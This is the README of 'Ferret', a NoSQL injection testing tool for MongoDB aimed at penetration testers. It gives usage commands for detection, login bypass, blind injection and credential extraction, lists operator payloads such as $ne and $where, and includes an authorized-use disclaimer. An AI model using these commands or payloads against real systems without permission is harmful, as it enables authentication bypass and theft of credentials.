# 🐾 Ferret — NoSQL Injection Testing Tool

> _"Ferret"_

![Python](https://img.shields.io/badge/Python-3.x-blue)
![Target](https://img.shields.io/badge/Target-MongoDB-green)
![Version](https://img.shields.io/badge/Version-1.0.0-red)
![Author](https://img.shields.io/badge/Author-Juggernaut-orange)

---

## What Is Ferret?

Ferret is a NoSQL injection testing tool targeting MongoDB applications.
Like ferret.

Built for penetration testers and security researchers.

---

## Features

| Feature           | Description                                                    |
| ----------------- | -------------------------------------------------------------- |
| Detection         | Auto-detect NoSQL injection points in URL params and JSON body |
| Login Bypass      | Attempt authentication bypass using MongoDB operators          |
| Data Extraction   | Extract usernames and passwords character by character         |
| Blind Detection   | Time-based and boolean-based blind injection detection         |
| Report Generation | Professional HTML and JSON reports                             |

---

## Installation

```bash
git clone https://github.com/onxerio/ferret
cd ferret
pip3 install -r requirements.txt
```

---

## Usage

### Basic Detection

```bash
python3 ferret.py -u http://target.com/api/login --detect
```

### Login Bypass

```bash
python3 ferret.py -u http://target.com/api/login --bypass
```

### Data Extraction

```bash
python3 ferret.py -u http://target.com/api/login --extract
```

### Blind Injection Detection

```bash
python3 ferret.py -u http://target.com/api/login --blind -p "username:admin,password:admin"
```

### Run Everything + Generate Report

```bash
python3 ferret.py -u http://target.com/api/login --all --report
```

### Custom Fields

```bash
python3 ferret.py -u http://target.com/api/login --bypass --username-field email --password-field pass
```

### GET Request

```bash
python3 ferret.py -u http://target.com/search --detect -m GET -p "q:test"
```

### Custom Headers

```bash
python3 ferret.py -u http://target.com/api/login --bypass --headers '{"Authorization": "Bearer token123"}'
```

---

## Options

-u, --url Target URL
-p, --params Parameters as key:value pairs (default: username:admin,password:admin)
-m, --method HTTP method GET or POST (default: POST)
--username-field Username field name (default: username)
--password-field Password field name (default: password)
--detect Run injection detection
--bypass Attempt login bypass
--extract Extract usernames and passwords
--blind Run blind injection detection
--all Run all modules
--usernames Comma separated usernames for extraction
--timeout Request timeout in seconds (default: 10)
--delay Delay threshold for blind detection (default: 2.0)
--report Generate HTML and JSON report
--headers Custom headers as JSON string

---

## Examples

```bash
# Detect injection on login page
python3 ferret.py -u http://localhost:5000/login --detect

# Bypass admin login
python3 ferret.py -u http://localhost:5000/login --bypass --username-field user --password-field pass

# Full scan with report
python3 ferret.py -u http://localhost:5000/login --all --report

# Extract specific usernames
python3 ferret.py -u http://localhost:5000/login --extract --usernames admin,root,user
```

---

## MongoDB Payloads Used

```json
{"$gt": ""}
{"$ne": null}
{"$exists": true}
{"$regex": ".*"}
{"$where": "1==1"}
```

---

## Disclaimer

Ferret is built for authorized penetration testing and security research only.
Do not use against systems you do not have permission to test.
The author is not responsible for misuse.

---

## Author

**Juggernaut**

- GitHub: [github.com/onxerio](https://github.com/onxerio)
- Tool: Ferret v1.0.0

---

_"🐾"_
